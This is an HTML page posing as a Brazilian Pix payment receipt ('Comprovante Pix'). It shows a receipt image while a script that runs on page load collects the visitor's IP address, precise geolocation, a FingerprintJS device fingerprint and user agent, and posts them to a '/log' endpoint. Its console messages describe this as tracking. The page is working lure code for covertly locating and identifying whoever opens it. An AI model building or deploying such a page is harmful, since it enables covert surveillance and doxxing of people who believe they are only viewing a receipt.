<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    console.log("üü° Script carregado... preparando rastreamento");

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            FingerprintJS.load()
              .then(fp => fp.get())
              .then(result => {
                const visitorId = result.visitorId;
                const device = navigator.userAgent;

                console.log("üìç Geolocaliza√ß√£o precisa:", lat, lon);
                console.log("üß† Fingerprint:", visitorId);

                fetch("/log", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    ip: ipData.ip,
                    visitorId,
                    userAgent: device,
                    device,
                    loc: `${lat},${lon}`
                  })
                })
                .then(r => {
                  if (r.ok) console.log("‚úÖ Dados enviados com sucesso");
                  else console.warn("‚ö†Ô∏è Problema ao enviar dados:", r.status);
                })
                .catch(err => console.error("‚ùå Falha no envio:", err));
              })
              .catch(err => console.error("‚ùå FingerprintJS falhou:", err));
          }, err => {
            console.warn("‚ö†Ô∏è Geolocaliza√ß√£o negada ou falhou:", err);
          });
        } else {
          console.log("‚ùå Geolocaliza√ß√£o n√£o suportada no navegador.");
        }
      })
      .catch(err => console.error("‚ùå Falha ao obter IP:", err));
  </script>
</body>
</html>
